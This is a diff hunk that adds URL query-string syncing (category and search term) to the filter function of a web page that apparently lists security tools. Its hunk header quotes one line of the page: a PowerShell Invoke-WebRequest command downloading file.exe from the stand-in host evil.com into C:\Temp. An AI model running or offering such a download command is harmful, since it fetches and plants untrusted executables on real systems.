@@ -333,7 +333,24 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
     const toolsGrid = document.getElementById('toolsGrid');
     let currentCategory = 'all';
 
+    function updateURL() {
+        const url = new URL(window.location);
+        if (currentCategory && currentCategory !== 'all') {
+            url.searchParams.set('category', currentCategory);
+        } else {
+            url.searchParams.delete('category');
+        }
+
+        if (searchInput.value) {
+            url.searchParams.set('q', searchInput.value);
+        } else {
+            url.searchParams.delete('q');
+        }
+        window.history.replaceState({}, '', url);
+    }
+
     function filterTools(searchTerm) {
+        updateURL();
         searchTerm = searchTerm.toLowerCase();
         let hasResults = false;
 
